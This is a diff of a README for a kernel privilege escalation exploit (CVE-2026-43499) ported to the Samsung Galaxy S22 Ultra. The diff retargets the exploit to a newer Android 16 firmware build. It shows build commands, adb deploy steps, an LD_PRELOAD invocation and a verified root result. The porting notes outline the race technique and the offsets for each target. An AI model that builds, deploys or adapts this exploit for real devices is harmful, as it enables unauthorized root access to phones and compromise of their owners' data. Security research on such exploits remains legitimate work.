@@ -21,12 +21,12 @@ exploit for the Samsung Galaxy S22 Ultra (SM-S908W).
 ```text
 Device: Samsung Galaxy S22 Ultra (SM-S908W)
 Codename: b0q
-Android: 15 / SDK 35
-Build number: AP3A.240905.015.A2.S908WVLS8FYG7
-Build display ID: AP3A.240905.015.A2.S908WVLS8FYG7
-Build fingerprint: samsung/b0qcsx/b0q:15/AP3A.240905.015.A2/S908WVLS8FYG7:user/release-keys
-Kernel: 5.10.226-android12-9-30958166-abS908WVLS8FYG7
-Architecture: aarch64
+Android: 16 / SDK 36
+Build number: BP2A.250605.031.A3.S908WVLSAGZE3
+Build display ID: BP2A.250605.031.A3.S908WVLSAGZE3
+Build fingerprint: samsung/b0qcsx/b0q:16/BP2A.250605.031.A3/S908WVLSAGZE3:user/release-keys
+Kernel: 5.10.236-android12-9-31998796-abS908WVLSAGZE3
+Architecture: arm64-v8a
 ```
 
 The offsets and structure layouts in this repository are specific to the
@@ -48,6 +48,7 @@ The upstream Apache License 2.0 is retained in [LICENSE](LICENSE).
 
 ## Main porting changes
 
+- Added the `b0q` / [`S908WVLSAGZE3` target](`src/targets/S908WVLSAGZE3/target.h`)
 - Ported exploit from v6.6 kernel (Galaxy S25 Ultra) to Android v5.10 kernel (Galaxy S22 Ultra / b0q).
 - Added the `b0q` / `S908WVLS8FYG7` target offsets (`src/targets/S908WVLS8FYG7/target.h`) and kernel structure layouts.
 - Replaced the pselect race with the `exp32` route: futex choreography, 32-bit stack stamp, and `sched_setattr` run in an embedded 32-bit child stage (`src/exp32/`).
@@ -68,7 +69,7 @@ The upstream Apache License 2.0 is retained in [LICENSE](LICENSE).
 Set `ANDROID_NDK_HOME` to Android NDK r27+ or a compatible toolchain, then run:
 
 ```sh
-make PROJECT=S908WVLS8FYG7 clean preload root-helper
+make PROJECT=S908WVLSAGZE3 clean preload root-helper
 ```
 
 To build for a QEMU environment running the Android kernel with a Buildroot filesystem:
@@ -76,23 +77,23 @@ To build for a QEMU environment running the Android kernel with a Buildroot file
 - **QEMU Kernel Execution Guide**: Setup and run guide at [QEMU Samsung README](https://github.com/sarabpal-dev/qemu/blob/samsung/docs/samsung/README.md)
 
 ```sh
-make USE_BUILDROOT=1 PROJECT=S908WVLS8FYG7 clean preload root-helper
+make USE_BUILDROOT=1 PROJECT=S908WVLSAGZE3 clean preload root-helper
 ```
 
 Outputs:
 
 ```text
-build/S908WVLS8FYG7/bin/cve-2026-43499
-build/S908WVLS8FYG7/bin/cve-2026-43499-root
-build/S908WVLS8FYG7/bin/cve-exp32
+build/S908WVLSAGZE3/bin/cve-2026-43499
+build/S908WVLSAGZE3/bin/cve-2026-43499-root
+build/S908WVLSAGZE3/bin/cve-exp32
 ```
 
 ## Deploy
 
 ```sh
-adb push build/S908WVLS8FYG7/bin/cve-2026-43499 /data/local/tmp/cve-2026-43499
-adb push build/S908WVLS8FYG7/bin/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
-adb push build/S908WVLS8FYG7/bin/cve-exp32 /data/local/tmp/cve-exp32
+adb push build/S908WVLSAGZE3/bin/cve-2026-43499 /data/local/tmp/cve-2026-43499
+adb push build/S908WVLSAGZE3/bin/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
+adb push build/S908WVLSAGZE3/bin/cve-exp32 /data/local/tmp/cve-exp32
 adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root /data/local/tmp/cve-exp32
 ```
 
@@ -132,7 +133,7 @@ Override the attempt count or base delay when collecting timing data:
 adb shell "EXPLOIT_ATTEMPTS=24 PSELECT_DELAY_USEC=20000 LD_PRELOAD=/data/local/tmp/cve-2026-43499 sh"
 ```
 
-Verified result on `S908WVLS8FYG7`:
+Verified result on `S908WVLSAGZE3`:
 
 ```text
 [*] root umh result wake=1 complete=1 retval=0 socket=1
